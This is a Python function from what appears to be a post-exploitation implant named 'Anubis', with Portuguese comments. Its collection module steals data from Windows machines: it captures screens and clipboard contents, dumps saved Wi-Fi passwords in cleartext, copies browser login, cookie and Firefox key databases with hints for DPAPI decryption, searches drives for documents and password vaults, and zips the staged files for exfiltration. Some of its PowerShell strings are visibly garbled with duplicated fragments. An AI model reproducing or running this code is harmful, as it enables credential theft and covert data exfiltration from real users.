def collection_ext(self, task_id, action="screenshot", path="", dest="",
                   exts=".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt",
                   keywords="", browser="chrome", all_drives=False,
                   max_files=200, max_mb=50):
    # collection_ext — Anubis (MITRE TA0009 - Collection)
    #   action=screenshot : captura todas as telas (T1113)
    #   action=clipboard  : dump do clipboard atual (T1115)
    #   action=browser    : coleta history/bookmarks/logins do Chrome/Edge/Firefox
    #   action=search     : busca arquivos por extensão/palavra-chave
    #   action=stage      : search + cópia para pasta de staging local (T1074)
    #   action=wifi       : perfis Wi-Fi com senha em claro
    #   action=cleanup    : apaga a pasta de staging
    import os, sys, json, time, glob, shutil, subprocess, tempfile, socket

    if platform.system() != 'Windows':
        return "collection_ext: ações de collection implementadas para Windows"

    STAGE_DIR = os.path.join(tempfile.gettempdir(), "anubis_stage")
    out = []
    ext_list = [e.strip().lower() for e in exts.split(",") if e.strip()]

    def run(cmd, timeout=120):
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return r.returncode, ((r.stdout or "") + (r.stderr or "")).strip()
        except Exception as e:
            return -1, str(e)

    def human(n):
        for u in ("B", "KB", "MB", "GB"):
            if n < 1024:
                return "%.1f %s" % (n, u)
            n /= 1024.0
        return "%.1f TB" % n

    def ensure_stage():
        os.makedirs(STAGE_DIR, exist_ok=True)
        return STAGE_DIR

    def drives():
        if all_drives:
            ds = []
            for c in "DEFGHIJKLMNOPQRSTUVWXYZ":
                p = c + ":\\"
                if os.path.exists(p):
                    ds.append(p)
            return ["C:\\"] + ds
        return [os.path.expanduser("~")]

    # ── CLEANUP ────────────────────────────────────────────────────────────
    if action == "cleanup":
        if os.path.isdir(STAGE_DIR):
            shutil.rmtree(STAGE_DIR, ignore_errors=True)
            return "[+] Staging removido: %s" % STAGE_DIR
        return "[*] Nada para limpar (%s não existe)" % STAGE_DIR

    # ── SCREENSHOT (T1113) ────────────────────────────────────────────────
    if action == "screenshot":
        d = ensure_stage()
        ts = time.strftime("%Y%m%d_%H%M%S")
        ps = (
            "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
            "$b=[System.Windows.Forms.SystemInformation]::VirtualScreen;"
            "bmp=New−ObjectSystem.Drawing.Bitmapbmp=New-Object System.Drawing.Bitmapbmp=New−ObjectSystem.Drawing.Bitmapb.Width,$b.Height;"
            "g=[System.Drawing.Graphics]::FromImage(g=[System.Drawing.Graphics]::FromImage(g=[System.Drawing.Graphics]::FromImage(bmp);"
            "g.CopyFromScreen(g.CopyFromScreen(g.CopyFromScreen(b.Left,b.Top,0,0,b.Top,0,0,b.Top,0,0,bmp.Size);"
            "$bmp.Save('%s\\shot_%s.png');"
            "Write-Output 'SHOT_OK'" % (d.replace("'", "''"), ts)
        )
        rc, res = run(["powershell.exe", "-NoProfile", "-NonInteractive",
                       "-ExecutionPolicy", "Bypass", "-Command", ps], timeout=90)
        f = os.path.join(d, "shot_%s.png" % ts)
        if rc == 0 and os.path.isfile(f):
            sz = os.path.getsize(f)
            out.append("[+] Screenshot salvo: %s (%s)" % (f, human(sz)))
            out.append("[*] Use o comando 'download' do Anubis nesse caminho.")
            return "\n".join(out)
        return "[!] screenshot falhou: %s" % res[:300]

    # ── CLIPBOARD (T1115) ─────────────────────────────────────────────────
    if action == "clipboard":
        ps = ("Add-Type -AssemblyName System.Windows.Forms;"
              "$t=[System.Windows.Forms.Clipboard]::GetText();"
              "$i=[System.Windows.Forms.Clipboard]::GetImage();"
              "if(-not t−andt -andt−andi){$i.Save('%s\\clip_%s.png');"
              "Write-Output 'CLIP_IMAGE'}elseif(t){Write-Output ('CLIP_TEXT|'+t)}"
              "else{Write-Output 'CLIP_EMPTY'}"
              % (ensure_stage().replace("'", "''"), time.strftime("%Y%m%d_%H%M%S")))
        rc, res = run(["powershell.exe", "-NoProfile", "-STA", "-NonInteractive",
                       "-Command", ps], timeout=60)
        if "CLIP_TEXT|" in res:
            txt = res.split("CLIP_TEXT|", 1)[1]
            out.append("[+] Clipboard (texto, %d chars):" % len(txt))
            out.append("-" * 60)
            out.append(txt[:4000])
            out.append("-" * 60)
            return "\n".join(out)
        if "CLIP_IMAGE" in res:
            return "[+] Clipboard contém IMAGEM — salva em %s (use download)" % \
                   [f for f in glob.glob(os.path.join(STAGE_DIR, "clip_*.png"))][-1]
        if "CLIP_EMPTY" in res:
            return "[*] Clipboard vazio ou sem texto/imagem acessível"
        return "[!] clipboard falhou: %s" % res[:300]

    # ── WIFI (T1005) ───────────────────────────────────────────────────────
    if action == "wifi":
        rc, profiles = run(["netsh", "wlan", "show", "profiles"])
        if rc != 0:
            return "[!] netsh wlan falhou: %s" % profiles[:200]
        names = []
        for line in profiles.splitlines():
            line = line.strip()
            if ":" in line and ("Perfil" in line or "Profile" in line):
                names.append(line.split(":", 1)[1].strip())
        out.append("[+] %d perfil(is) Wi-Fi encontrado(s)" % len(names))
        for name in names:
            _, det = run(["netsh", "wlan", "show", "profile", "name=%s" % name,
                          "key=clear"])
            pwd = ""
            for l in det.splitlines():
                if "Conteúdo da Chave" in l or "Key Content" in l:
                    pwd = l.split(":", 1)[1].strip()
            out.append("    SSID: %-30s Senha: %s" % (name, pwd or "<sem senha/aberta>"))
        return "\n".join(out)

    # ── BROWSER (T1005/T1555.003) ─────────────────────────────────────────
    if action == "browser":
        d = ensure_stage()
        local = os.environ.get("LOCALAPPDATA", "")
        roaming = os.environ.get("APPDATA", "")
        sources = {
            "chrome": [
                (os.path.join(local, r"Google\Chrome\User Data\Default"),
                 ["History", "Bookmarks", "Cookies", "Login Data", "Web Data"]),
            ],
            "edge": [
                (os.path.join(local, r"Microsoft\Edge\User Data\Default"),
                 ["History", "Bookmarks", "Cookies", "Login Data", "Web Data"]),
            ],
            "firefox": [],  # perfiles descobertos dinamicamente
        }
        b = browser.lower().strip()
        if b == "firefox":
            prof_root = os.path.join(roaming, r"Mozilla\Firefox\Profiles")
            if os.path.isdir(prof_root):
                for prof in os.listdir(prof_root):
                    pd = os.path.join(prof_root, prof)
                    ff = []
                    for fn in ("places.sqlite", "cookies.sqlite",
                               "logins.json", "key4.db", "formhistory.sqlite"):
                        fp = os.path.join(pd, fn)
                        if os.path.isfile(fp):
                            ff.append(fp)
                    for fp in ff:
                        dstp = os.path.join(d, "firefox_" + prof[:8] + "_" +
                                            os.path.basename(fp))
                        try:
                            shutil.copy2(fp, dstp)
                            out.append("[+] firefox/%s → %s (%s)" %
                                       (prof[:8], os.path.basename(dstp),
                                        human(os.path.getsize(dstp))))
                        except OSError as e:
                            out.append("[!] firefox %s: %s" % (fp, str(e)[:120]))
                if not any(l.startswith("[+]") for l in out):
                    out.append("[*] Firefox: nenhum artefato copiado "
                               "(perfil bloqueado?)")
            else:
                out.append("[*] Firefox não instalado")
            return "\n".join(out)

        if b not in sources:
            return "[!] browser inválido '%s' (use chrome/edge/firefox)" % browser
        found = False
        for base, files in sources[b]:
            if not os.path.isdir(base):
                continue
            found = True
            for fn in files:
                fp = os.path.join(base, fn)
                if os.path.isfile(fp):
                    dstp = os.path.join(d, "%s_%s" % (b, fn.replace(" ", "_")))
                    try:
                        shutil.copy2(fp, dstp)
                        out.append("[+] %s → %s (%s)" % (fp, os.path.basename(dstp),
                                   human(os.path.getsize(dstp))))
                    except OSError as e:
                        # arquivo travado pelo navegador — tenta VSS-less copy via PS
                        rc2, res2 = run([
                            "powershell.exe", "-NoProfile", "-NonInteractive",
                            "-Command",
                            "Copy-Item -LiteralPath '%s' -Destination '%s' -Force" %
                            (fp.replace("'", "''"), dstp.replace("'", "''"))])
                        if rc2 == 0 and os.path.isfile(dstp):
                            out.append("[+] %s (retry PS) → %s" % (fp,
                                       os.path.basename(dstp)))
                        else:
                            out.append("[!] %s: bloqueado (%s)" % (fn, str(e)[:100]))
        if not found:
            out.append("[*] %s não encontrado neste host" % b)
        else:
            out.append("")
            out.append("[*] Cookies/Login Data são criptografados (DPAPI) — "
                       "decriptar no operador com DPAPI/pycryptodome usando o "
                       "contexto do usuário (ex.: chrome_cookies_view, "
                       "SharpChrome /donorkey).")
        out.append("[*] Arquivos em: %s (use 'download')" % d)
        return "\n".join(out)

    # ── SEARCH / STAGE (T1005 + T1074) ────────────────────────────────────
    if action in ("search", "stage"):
        roots = [path] if path else drives()
        hits = []
        total_sz = 0
        kw = [k.lower() for k in keywords.split(",") if k.strip()]
        limit_bytes = int(max_mb) * 1024 * 1024
        for root in roots:
            if not os.path.isdir(root):
                continue
            for dirpath, dirnames, filenames in os.walk(root, topdown=True):
                # poda pastas ruidosas/protegidas
                dirnames[:] = [dd for dd in dirnames if dd not in (
                    "Windows", "Program Files", "Program Files (x86)",
                    "AppData", "$Recycle.Bin")] if root.endswith(":\\") else dirnames
                if len(hits) >= int(max_files) or total_sz >= limit_bytes:
                    break
                for fn in filenames:
                    low = fn.lower()
                    match_ext = any(low.endswith(e) for e in ext_list)
                    match_kw = bool(kw) and any(k in low for k in kw)
                    if not (match_ext or match_kw):
                        continue
                    fp = os.path.join(dirpath, fn)
                    try:
                        sz = os.path.getsize(fp)
                    except OSError:
                        continue
                    hits.append((fp, sz))
                    total_sz += sz
                    if len(hits) >= int(max_files) or total_sz >= limit_bytes:
                        break
        if not hits:
            return "[*] Nenhum arquivo bateu com os critérios (exts=%s kw=%s)" % \
                   (exts, keywords or "-")

        out.append("[+] %d arquivo(s) — %s no total" % (len(hits), human(total_sz)))
        if action == "search":
            for fp, sz in hits[:int(max_files)]:
                out.append("    %-12s %s" % (human(sz), fp))
        else:  # stage
            d = ensure_stage()
            copied = failed = 0
            for fp, _sz in hits:
                rel = fp.replace(":", "_").replace("\\", "__")
                dstp = os.path.join(d, rel[-180:])
                try:
                    shutil.copy2(fp, dstp)
                    copied += 1
                except OSError:
                    failed += 1
            out.append("")
            out.append("[+] Stage: %d copiado(s) para %s (%d falha(s))"
                       % (copied, d, failed))
            out.append("[*] Compactando para facilitar exfiltração...")
            zip_path = os.path.join(tempfile.gettempdir(),
                                    "anubis_stage_%s.zip" %
                                    time.strftime("%Y%m%d_%H%M%S"))
            rcz, resz = run(
                ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command",
                 "Compress-Archive -LiteralPath '%s' -DestinationPath '%s' -Force"
                 % ((STAGE_DIR + "\\*").replace("'", "''"),
                    zip_path.replace("'", "''"))], timeout=300)
            if rcz == 0 and os.path.isfile(zip_path):
                out.append("[+] ZIP pronto para download/exfil: %s (%s)"
                           % (zip_path, human(os.path.getsize(zip_path))))
            else:
                out.append("[!] Compress-Archive falhou: %s — baixe a pasta direto"
                           % resz[:150])
        out.append("")
        out.append("[*] Limpeza posterior: collection_ext {\"action\":\"cleanup\"}")
        return "\n".join(out)

    return ("[!] action inválida '%s' — use: screenshot, clipboard, browser, "
            "search, stage, wifi, cleanup" % action)
